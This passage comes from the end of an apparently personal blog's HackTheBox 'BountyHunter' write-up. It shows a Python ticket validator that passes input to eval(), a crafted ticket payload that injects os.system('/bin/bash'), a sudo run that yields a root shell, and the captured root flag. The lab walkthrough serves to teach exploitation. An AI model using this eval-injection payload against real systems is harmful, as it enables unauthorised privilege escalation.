    <span class="k">for</span> <span class="n">i</span><span class="p">,</span><span class="n">x</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">ticketFile</span><span class="p">.</span><span class="n">readlines</span><span class="p">()):</span>
        <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
            <span class="k">if</span> <span class="ow">not</span> <span class="n">x</span><span class="p">.</span><span class="n">startswith</span><span class="p">(</span><span class="s">"# Skytrain Inc"</span><span class="p">):</span>
                <span class="k">return</span> <span class="bp">False</span>
            <span class="k">continue</span>
        <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
            <span class="k">if</span> <span class="ow">not</span> <span class="n">x</span><span class="p">.</span><span class="n">startswith</span><span class="p">(</span><span class="s">"## Ticket to "</span><span class="p">):</span>
                <span class="k">return</span> <span class="bp">False</span>
            <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Destination: </span><span class="si">{</span><span class="s">' '</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">x</span><span class="p">.</span><span class="n">strip</span><span class="p">().</span><span class="n">split</span><span class="p">(</span><span class="s">' '</span><span class="p">)[</span><span class="mi">3</span><span class="p">:])</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
            <span class="k">continue</span>

        <span class="k">if</span> <span class="n">x</span><span class="p">.</span><span class="n">startswith</span><span class="p">(</span><span class="s">"__Ticket Code:__"</span><span class="p">):</span>
            <span class="n">code_line</span> <span class="o">=</span> <span class="n">i</span><span class="o">+</span><span class="mi">1</span>
            <span class="k">continue</span>

        <span class="k">if</span> <span class="n">code_line</span> <span class="ow">and</span> <span class="n">i</span> <span class="o">==</span> <span class="n">code_line</span><span class="p">:</span>
            <span class="k">if</span> <span class="ow">not</span> <span class="n">x</span><span class="p">.</span><span class="n">startswith</span><span class="p">(</span><span class="s">"**"</span><span class="p">):</span>
                <span class="k">return</span> <span class="bp">False</span>
            <span class="n">ticketCode</span> <span class="o">=</span> <span class="n">x</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"**"</span><span class="p">,</span> <span class="s">""</span><span class="p">).</span><span class="n">split</span><span class="p">(</span><span class="s">"+"</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
            <span class="k">if</span> <span class="nb">int</span><span class="p">(</span><span class="n">ticketCode</span><span class="p">)</span> <span class="o">%</span> <span class="mi">7</span> <span class="o">==</span> <span class="mi">4</span><span class="p">:</span>
                <span class="n">validationNumber</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">x</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"**"</span><span class="p">,</span> <span class="s">""</span><span class="p">))</span>
                <span class="k">if</span> <span class="n">validationNumber</span> <span class="o">&gt;</span> <span class="mi">100</span><span class="p">:</span>
                    <span class="k">return</span> <span class="bp">True</span>
                <span class="k">else</span><span class="p">:</span>
                    <span class="k">return</span> <span class="bp">False</span>
    <span class="k">return</span> <span class="bp">False</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="n">fileName</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">"Please enter the path to the ticket file.</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
    <span class="n">ticket</span> <span class="o">=</span> <span class="n">load_file</span><span class="p">(</span><span class="n">fileName</span><span class="p">)</span>
    <span class="c1">#DEBUG print(ticket)
</span>    <span class="n">result</span> <span class="o">=</span> <span class="n">evaluate</span><span class="p">(</span><span class="n">ticket</span><span class="p">)</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">result</span><span class="p">):</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"Valid ticket."</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"Invalid ticket."</span><span class="p">)</span>
    <span class="n">ticket</span><span class="p">.</span><span class="n">close</span>

<span class="n">main</span><span class="p">()</span>
</pre></table></code></div></div><h3 id="lets-evaluate">Let’s evaluate;</h3><p>The script loads an input file with <code class="language-plaintext highlighter-rouge">.md</code> extension, in a specific format.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre># Skytrain Inc
## Ticket to
__Ticket Code:__
**
</pre></table></code></div></div><p>Then the line <code class="language-plaintext highlighter-rouge">splits at position 0 at +</code> We need to find the ticket number, that is greater than 100. also we need to satisfy the condition <code class="language-plaintext highlighter-rouge">ticketcode % 7 == 4</code> With knowledge in basic <code class="language-plaintext highlighter-rouge">Modulo Operator</code> we can find the value of <code class="language-plaintext highlighter-rouge">ticketcode</code></p><p>Here, the value is <code class="language-plaintext highlighter-rouge">102</code>.</p><p>When all the conditions are met, the script will evaluate (<code class="language-plaintext highlighter-rouge">eval()</code>) our ticket. We can take advantage of this function because <code class="language-plaintext highlighter-rouge">eval()</code> function is dangerous and can be exploited.</p><p>So, keeping all this in mind let’s create our ticket <code class="language-plaintext highlighter-rouge">root.md</code></p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="c"># Skytrain Inc</span>
<span class="c">## Ticket to </span>
__Ticket Code:__
<span class="k">**</span>102+ 1 <span class="o">==</span> 103 and __import__<span class="o">(</span><span class="s1">'os'</span><span class="o">)</span>.system<span class="o">(</span><span class="s1">'/bin/bash'</span><span class="o">)</span> <span class="o">==</span> FALSE
</pre></table></code></div></div><p>create a file <code class="language-plaintext highlighter-rouge">root.md</code> with the above content in <code class="language-plaintext highlighter-rouge">/tmp</code> folder and validate the ticket.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre>development@bountyhunter:/tmp<span class="nv">$ </span><span class="nb">ls
</span>root.md   &lt;<span class="nt">---</span> ticket
systemd-private-89dd429b92d24870a498379258426fff-apache2.service-uCbbef
systemd-private-89dd429b92d24870a498379258426fff-systemd-logind.service-YdKkrg
systemd-private-89dd429b92d24870a498379258426fff-systemd-resolved.service-HwFR4e
systemd-private-89dd429b92d24870a498379258426fff-systemd-timesyncd.service-geSBFf
vmware-root_666-2731021219
development@bountyhunter:/tmp<span class="nv">$ </span><span class="nb">sudo</span> /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
Please enter the path to the ticket file.
root.md
Destination: 
root@bountyhunter:/tmp# <span class="nb">whoami</span><span class="p">;</span><span class="nb">hostname
</span>root
bountyhunter
root@bountyhunter:/tmp#
</pre></table></code></div></div><p>That worked, we have succefully pwned the system, Go to the <code class="language-plaintext highlighter-rouge">root</code> folder to grab the <code class="language-plaintext highlighter-rouge">root</code> flag.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre>root@bountyhunter:/tmp# <span class="nb">cd</span> /root
root@bountyhunter:~# <span class="nb">ls</span> <span class="nt">-la</span>
total 36
drwx------  6 root root 4096 Jul 22 11:11 <span class="nb">.</span>
drwxr-xr-x 19 root root 4096 Jul 21 12:00 ..
lrwxrwxrwx  1 root root    9 Apr  5  2021 .bash_history -&gt; /dev/null
<span class="nt">-rw-r--r--</span>  1 root root 3106 Dec  5  2019 .bashrc
drwx------  2 root root 4096 Apr  6  2021 .cache
drwxr-xr-x  3 root root 4096 Apr  5  2021 .local
<span class="nt">-rw-r--r--</span>  1 root root  161 Dec  5  2019 .profile
drwx------  2 root root 4096 Apr  5  2021 .ssh
lrwxrwxrwx  1 root root    9 Jul 22 11:11 .viminfo -&gt; /dev/null
<span class="nt">-r--------</span>  1 root root   33 Nov 19 20:21 root.txt   &lt;<span class="nt">---</span> root flag
drwxr-xr-x  3 root root 4096 Apr  5  2021 snap
root@bountyhunter:~# <span class="nb">cat </span>root.txt
f2437623c75173288eaf6c4c17412a7e
root@bountyhunter:~#
</pre></table></code></div></div><h2 id="resources">Resources</h2><div class="table-wrapper"><table><thead><tr><th>Topic<th>Url<tbody><tr><td>A Deep Dive into XXE Injection<td><a href="https://www.synack.com/blog/a-deep-dive-into-xxe-injection/">Click here</a></table></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>HackTheBox</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/hackthebox/" class="post-tag no-text-decoration" >hackthebox</a> <a href="/tags/xxe/" class="post-tag no-text-decoration" >xxe</a> <a href="/tags/python/" class="post-tag no-text-decoration" >python</a> <a href="/tags/lfi/" class="post-tag no-text-decoration" >lfi</a> <a href="/tags/eval/" class="post-tag no-text-decoration" >eval()</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=HackTheBox[BOUNTYHUNTER] - V1NC1D4&url=/posts/HackTheBox-BOUNTYHUNTER/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=HackTheBox[BOUNTYHUNTER] - V1NC1D4&u=/posts/HackTheBox-BOUNTYHUNTER/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=HackTheBox[BOUNTYHUNTER] - V1NC1D4&url=/posts/HackTheBox-BOUNTYHUNTER/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink('', 'Link copied successfully!')" data-toggle="tooltip" data-placement="top" title="Copy link"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/HackTheBox-BACKDOOR/">HackTheBox[BACKDOOR]</a><li><a href="/posts/HackTheBox-BOUNTYHUNTER/">HackTheBox[BOUNTYHUNTER]</a><li><a href="/posts/HackTheBox-DOCTOR/">HackTheBox[DOCTOR]</a><li><a href="/posts/HackTheBox-KNIFE/">HackTheBox[KNIFE]</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/hackthebox/">hackthebox</a> <a class="post-tag" href="/tags/suid/">SUID</a> <a class="post-tag" href="/tags/gobuster/">gobuster</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/offsec-pg/">offsec-pg</a> <a class="post-tag" href="/tags/base32/">base32</a> <a class="post-tag" href="/tags/brute-force/">brute-force</a> <a class="post-tag" href="/tags/capabilities/">capabilities</a> <a class="post-tag" href="/tags/dd/">dd</a> <a class="post-tag" href="/tags/eval/">eval()</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/HackTheBox-BACKDOOR/"><div class="card-body"> <span class="timeago small" >Nov 22, 2021<i class="unloaded">2021-11-22T00:00:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox[BACKDOOR]</h3><div class="text-muted small"><p> When a door closes, another opens…. At least for #hackers Backdoor #Easy #Linux Machine created by hkabubaker17 About The Machine Name OS Difficulty Creator ...</p></div></div></a></div><div class="card"> <a href="/posts/HackTheBox-DOCTOR/"><div class="card-body"> <span class="timeago small" >Feb 5, 2021<i class="unloaded">2021-02-05T22:00:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox[DOCTOR]</h3><div class="text-muted small"><p> Doctor is an easy rated CTF style machine at Hackthebox, featuring Server Side Template Injection(SSTI) and privilege escalation by exploiting Splunk Universal Forwarder. About The Machine ...</p></div></div></a></div><div class="card"> <a href="/posts/HackTheBox-KNIFE/"><div class="card-body"> <span class="timeago small" >Aug 28, 2021<i class="unloaded">2021-08-28T12:00:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox[KNIFE]</h3><div class="text-muted small"><p> In this blog, we are going to discuss about pwning knife from hackthebox. About The Machine Name OS Difficulty Creator Knife Linux ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Offsec-PG-GEISHA/" class="btn btn-outline-primary" prompt="Older"><p>Offsec-PG[GEISHA]</p></a> <a href="/posts/HackTheBox-BACKDOOR/" class="btn btn-outline-primary" prompt="Newer"><p>HackTheBox[BACKDOOR]</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/v1nc1d4">Anurag M</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/hackthebox/">hackthebox</a> <a class="post-tag" href="/tags/suid/">SUID</a> <a class="post-tag" href="/tags/gobuster/">gobuster</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/offsec-pg/">offsec pg</a> <a class="post-tag" href="/tags/base32/">base32</a> <a class="post-tag" href="/tags/brute-force/">brute force</a> <a class="post-tag" href="/tags/capabilities/">capabilities</a> <a class="post-tag" href="/tags/dd/">dd</a> <a class="post-tag" href="/tags/eval/">eval()</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-H1DGTBDGQ7"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-H1DGTBDGQ7'); }); </script>
